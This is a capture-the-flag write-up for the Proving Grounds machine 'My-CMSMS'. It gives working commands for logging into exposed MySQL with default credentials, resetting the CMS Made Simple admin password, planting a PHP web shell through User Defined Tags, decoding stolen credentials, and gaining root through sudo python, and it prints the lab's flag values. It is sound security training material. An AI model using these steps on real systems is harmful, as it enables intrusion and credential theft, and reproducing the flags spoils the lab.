# My-CMSMS - Proving Grounds Play

## Machine Info
- **Platform:** Offensive Security Proving Grounds (Play)
- **Difficulty:** Intermediate
- **IP Address:** 192.168.142.74
- **OS:** Debian 10

## Objectives Completed
- Identify weak MySQL credentials and enumerate the database for user hashes
- Reset the CMS MS admin user's password directly in the database
- Exploit the CMS MS User Defined Tags functionality to achieve Remote Code Execution (RCE)
- Recover encoded credentials from a sensitive system file and decode them successfully
- Exploit misconfigured sudo permissions on /usr/bin/python to escalate privileges to root

## Summary
This machine runs CMS Made Simple 2.2.13 with an externally accessible MySQL database using weak credentials (root:root). After resetting the admin password in the database, the User Defined Tags feature is exploited for RCE. Encoded credentials found in `.htpasswd` (Base64 -> Base32) reveal SSH credentials for user `armour`, who has sudo NOPASSWD access to Python, allowing root escalation.

---

## Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -p- --min-rate=1000 192.168.142.74
```

**Results:**
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.
3306/tcp  open  mysql   MySQL 8.0.19
33060/tcp open  mysqlx  MySQL X protocol listener
```

**Key Findings:**
- SSH (22) - OpenSSH 7.9p1
- HTTP (80) - Apache 2.4.38 with **CMS Made Simple 2.2.13**
- MySQL (3306) - **Externally accessible** MySQL 8.0.19
- MySQL X (33060) - MySQL X protocol

---

## Enumeration

### MySQL Enumeration

The MySQL service is accessible externally. Test common credentials:

```bash
mysql -h 192.168.142.74 -u root -proot --ssl=false -e 'SHOW DATABASES;'
```

**Output:**
```
Database
cmsms_db
information_schema
mysql
performance_schema
sys
```

**Weak credentials found:** `root:root`

### Database Enumeration

```bash
mysql -h 192.168.142.74 -u root -proot --ssl=false -e 'USE cmsms_db; SELECT * FROM cms_users;'
```

**Output:**
```
user_id  username  password                          admin_access
1        admin     59f9ba27528694d9b3493dfde7709e70  1
```

**Admin password hash:** `59f9ba27528694d9b3493dfde7709e70` (MD5)

### Getting the Salt

```bash
mysql -h 192.168.142.74 -u root -proot --ssl=false -e \
  "USE cmsms_db; SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask';"
```

**Salt:** `a235561351813137`

---

## Exploitation

### Resetting Admin Password

CMS Made Simple uses `md5(salt + password)` format. Generate a new hash:

```bash
# Generate hash for password "hacked"
echo -n 'a235561351813137hacked' | md5sum | cut -d' ' -f1
# Output: 15e69a6ca07dfe39ad2c732e725cc3f1
```

Update the password in the database:

```bash
mysql -h 192.168.142.74 -u root -proot --ssl=false -e \
  "USE cmsms_db; UPDATE cms_users SET password='15e69a6ca07dfe39ad2c732e725cc3f1' WHERE username='admin';"
```

**New admin credentials:** `admin:hacked`

### Admin Panel Access

Login at `http://192.168.142.74/admin/login.php` with `admin:hacked`

### User Defined Tags RCE

Navigate to **Extensions > User Defined Tags** and create a new tag:

1. Click "Add User Defined Tag"
2. Name: `shell`
3. Code: `return shell_exec($_REQUEST["c"]);`
4. Click "Apply" then "Run"

Test RCE via AJAX:

```bash
curl -s -b cookies.txt 'http://192.168.142.74/admin/editusertag.php' \
  -X POST --data-urlencode 'code=return shell_exec($_REQUEST["c"]);' \
  -d '__c=TOKEN&userplugin_id=8&userplugin_name=shell&run=1&apply=1&ajax=1' \
  --data-urlencode 'c=id'
```

**Output:**
```json
{"response":"Success","details":"uid=33(www-data) gid=33(www-data) groups=33(www-data)..."}
```

**RCE achieved as www-data!**

### Local Flag

```bash
# Via UDT RCE
c=cat /var/www/local.txt
```

**local.txt:** `35e6f40decfa744773bb1dd8bd5cc161`

---

## Privilege Escalation

### Finding Encoded Credentials

Search for sensitive files:

```bash
# Find .htpasswd files
c=find / -name ".htpasswd" 2>/dev/null
```

**Output:**
```
/var/www/html/admin/.htpasswd
/etc/apache2/.htpasswd
```

Read the CMS admin htpasswd:

```bash
c=cat /var/www/html/admin/.htpasswd
```

**Output:**
```
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
```

### Decoding Credentials

The string is **double-encoded** (Base64 -> Base32):

```bash
# First decode Base64
echo 'TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=' | base64 -d
# Output: MFZG233VOI5FG2DJMVWGIQBRGIZQ====

# Then decode Base32
echo 'MFZG233VOI5FG2DJMVWGIQBRGIZQ====' | base32 -d
# Output: armour:Shield@123
```

**Credentials found:**
- **Username:** `armour`
- **Password:** `Shield@123`

### Checking Sudo Privileges

```bash
# Via UDT, su to armour and check sudo
c=echo Shield@123 | su - armour -c "sudo -l" 2>&1
```

**Output:**
```
User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python
```

### Root Escalation via Python

```bash
# Via UDT, execute as root
c=echo Shield@123 | su - armour -c "sudo /usr/bin/python -c \"import os; print(os.popen('cat /root/proof.txt').read())\"" 2>&1
```

**ROOT ACCESS ACHIEVED!**

### Root Flag

```bash
c=echo Shield@123 | su - armour -c "sudo /usr/bin/python -c \"import os; print(os.popen('cat /root/proof.txt').read())\""
```

**proof.txt:** `f314f091fd1fd0255117d872dbdc05ca`

---

## Flags

| Flag Type | Value |
|-----------|-------|
| local.txt | `35e6f40decfa744773bb1dd8bd5cc161` |
| proof.txt | `f314f091fd1fd0255117d872dbdc05ca` |

---

## Key Takeaways

1. **Exposed MySQL:** Never expose MySQL to the network with weak credentials
2. **Password Reset via Database:** Direct database access allows bypassing authentication
3. **User Defined Tags:** CMS features allowing PHP code execution are dangerous
4. **Encoded Credentials:** Always check for encoded data (Base64, Base32, etc.) in config files
5. **Sudo Misconfiguration:** Python with NOPASSWD sudo is equivalent to root access

---

## Tools Used

- nmap
- mysql/mariadb client
- curl
- base64/base32

---

## Attack Path Summary

```
MySQL (root:root)
    ↓
Reset admin password in cms_users table
    ↓
Login to CMS Made Simple admin panel
    ↓
Create User Defined Tag with PHP RCE
    ↓
Find .htpasswd with encoded credentials
    ↓
Decode Base64 → Base32 → armour:Shield@123
    ↓
armour has sudo NOPASSWD: /usr/bin/python
    ↓
sudo python -c 'import os; os.system("/bin/bash")'
    ↓
ROOT!
```

---

## References

- [CMS Made Simple](https://www.cmsmadesimple.org/)
- [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/)
- [User Defined Tags Documentation](https://docs.cmsmadesimple.org/user-handbook/user-defined-tags)
